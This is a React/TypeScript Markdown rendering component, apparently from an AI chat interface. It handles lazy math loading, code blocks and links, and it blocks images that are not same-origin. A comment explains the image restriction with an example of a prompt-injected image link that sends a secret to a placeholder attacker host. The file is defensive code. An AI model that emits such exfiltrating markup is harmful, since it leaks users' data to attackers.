import { memo, useEffect, useState } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { CodeBlock } from './CodeBlock'
import { mightHaveMath, prepareMath } from './math'

type MathMod = typeof import('./mathPlugins')
let mathPromise: Promise<MathMod> | null = null
let loadedMath: MathMod | null = null
const loadMath = () =>
  (mathPromise ??= import('./mathPlugins').then(
    (m) => (loadedMath = m),
    (e) => {
      mathPromise = null // a failed chunk load must be retryable, not cached forever
      throw e
    },
  ))

/** Loads the math plugins lazily, only once some text needs them. */
function useMath(needed: boolean): MathMod | null {
  // Start from the already-loaded module so later messages render math without a flash.
  const [mod, setMod] = useState<MathMod | null>(loadedMath)
  useEffect(() => {
    if (needed && !mod) void loadMath().then(setMod).catch(() => {})
  }, [needed, mod])
  return mod
}

const HEADING = ({ children }: { children?: React.ReactNode }) => <p className="font-semibold">{children}</p>

function makeComponents(streaming: boolean, muted: boolean): Components {
  return {
    ...(muted ? { h1: HEADING, h2: HEADING, h3: HEADING, h4: HEADING, h5: HEADING, h6: HEADING } : {}),
    pre: ({ children }) => <>{children}</>,
    code({ className, children }) {
      const text = String(children ?? '')
      const lang = /language-([\w+-]+)/.exec(className ?? '')?.[1]
      if (lang || text.includes('\n')) {
        return <CodeBlock code={text} language={lang} streaming={streaming} />
      }
      return <code>{children}</code>
    },
    a: ({ href, children }) => (
      <a href={href} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    ),
    table: ({ children }) => (
      <div className="table-wrap">
        <table>{children}</table>
      </div>
    ),
    // Only same-origin /api/files media is inlined: any other URL would fire a request that can leak data
    // (e.g. a prompt-injected `![x](https://attacker/?d=secret)`). Everything else degrades to a plain link.
    img: ({ src, alt }) => {
      if (typeof src !== 'string') return null
      if (isApiFileUrl(src)) {
        return <img src={src} alt={alt ?? ''} loading="lazy" className="max-h-[480px] max-w-full rounded-lg object-contain" />
      }
      const label = alt || src
      return /^https?:\/\//i.test(src) ? (
        <a href={src} target="_blank" rel="noopener noreferrer">
          {label}
        </a>
      ) : (
        <span>{alt ?? ''}</span>
      )
    },
  }
}

/** True for `/api/files/...` on the page's own origin (relative, or absolute with that origin). */
export function isApiFileUrl(src: string): boolean {
  try {
    const u = new URL(src, window.location.origin)
    return u.origin === window.location.origin && u.pathname.startsWith('/api/files/')
  } catch {
    return false
  }
}

const STREAMING = makeComponents(true, false)
const STATIC = makeComponents(false, false)
const STREAMING_MUTED = makeComponents(true, true)
const STATIC_MUTED = makeComponents(false, true)

/** `muted` is for thinking text: small, subdued, headings flattened to bold lines. */
export const Markdown = memo(function Markdown({ text, streaming = false, muted = false }: { text: string; streaming?: boolean; muted?: boolean }) {
  const math = useMath(mightHaveMath(text))
  const source = math ? prepareMath(text) : text
  return (
    <div className={muted ? 'md md-muted' : 'md'} data-testid="markdown">
      <ReactMarkdown remarkPlugins={math ? [remarkGfm, ...math.remarkMathPlugins] : [remarkGfm]} rehypePlugins={math ? [...math.rehypeMathPlugins] : []} skipHtml components={muted ? (streaming ? STREAMING_MUTED : STATIC_MUTED) : streaming ? STREAMING : STATIC}>
        {source}
      </ReactMarkdown>
    </div>
  )
})
